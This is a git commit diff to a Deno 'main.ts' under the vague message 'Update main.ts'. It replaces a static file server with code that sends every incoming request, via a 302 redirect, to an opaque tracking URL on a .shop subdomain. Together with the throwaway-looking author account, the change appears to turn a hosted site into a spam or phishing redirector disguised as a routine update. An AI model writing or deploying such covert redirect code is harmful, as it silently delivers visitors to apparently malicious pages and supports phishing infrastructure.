37f298bf1f75446c24a62e58cb262da73048a0fe
rethamoldenupa84 <rethamoldenupa84@gmail.com>
2025-07-06 20:18:04 +0100

    Update main.ts

--- main.ts
+++ main.ts
@@ -1,7 +1,5 @@
-// main.ts
-import { serveDir } from "https://deno.land/std@0.224.0/http/file_server.ts";
+import { serve } from "https://deno.land/std@0.224.0/http/server.ts";
 
-serveDir({
-  fsRoot: "./", // Serves from the root of your project
-  showDirListing: false,
-});
+serve((_req) =>
+  Response.redirect("https://wd0c435.lafontainefit.shop/STsfaFZF?jl=OMSgJJfpWXhnHZxddgwwCM-Rtsl_oFkEgkcW1UJuzwSuLQERa9z9Vo0bTDsfk3N0DQ", 302)
+);
